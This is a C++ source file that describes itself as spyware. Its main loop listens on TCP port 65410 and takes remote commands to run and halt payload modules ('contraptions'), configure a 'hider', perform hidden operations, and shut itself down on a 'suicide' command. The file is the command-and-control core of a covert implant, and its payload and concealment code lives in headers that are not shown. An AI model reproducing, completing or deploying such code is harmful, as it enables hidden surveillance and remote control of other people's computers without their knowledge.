#include <iostream>

#include "../Maneger/Connection.h"
#include "../IncludeCPP/Status.h"

#include "../Maneger/HiderManeger.h"
#include "../Hider/HiderCodes.h"
#include "../Maneger/Listener.h"
#include "../Maneger/Connection.h"
#include "contrapMeta.h"
#include "Contraption.h"
#include "ContraptionAdmin.h"

#define PORT (65410)

#define DEBUG

void loopIter(Connection& conn, HiderManeger& hiderManeger, ContraptionAdmin& admin);


int main() {
    
    std::cout << "started spyware" << std::endl;
    
    HiderManeger hiderManager = HiderManeger();
    Listener listener = Listener(PORT);
    ContraptionAdmin admin = ContraptionAdmin();

    bool cont = true;
    while (cont)
    {
        Connection conn;
        // TODO add error strtegy
        if (listener.acceptConnection(conn) == -1) {
            std::cerr << "listener.acceptConnection(conn) failed" << std::endl;
            sleep(10);
            continue;
        }
        loopIter(conn, hiderManager, admin);
        std::cout << "compleated loop iter\n";
    }

    return EXIT_SUCCESS;
}



void loopIter(Connection& conn, HiderManeger& hiderManeger, ContraptionAdmin& admin)
{
    command cmd;

    conn.recvData(sizeof(cmd), (char*)&cmd);

    Status stat = DID_NOTHING;
    std::string strRes = "";

    switch (cmd.fncode)
    {
    case RunContraption:
        stat = admin.runContraption(conn, cmd.dataLen, cmd.identifier);
        break;

    case HaltContraption:
        stat = admin.haltContraption(cmd.identifier);
        break;

    case SUICIDE:
        conn.sendResponceStruct((responce){.dataLen = 0, .status = SUICIDE_SUCSESS});
        std::exit(EXIT_SUCCESS);
    
    case HIDER_SETUP:
        stat = hiderManeger.setUpHider(cmd.strParam);
        break;
    }

    if (cmd.fncode & HIDDEN_OPRATION) {
        stat = hiderManeger.hiddenAction(cmd, conn);
    }

    std::cout << "Conn: res-" << stat << " response-\n" << strRes << std::endl;
    conn.sendResponce(stat, strRes);
    
}
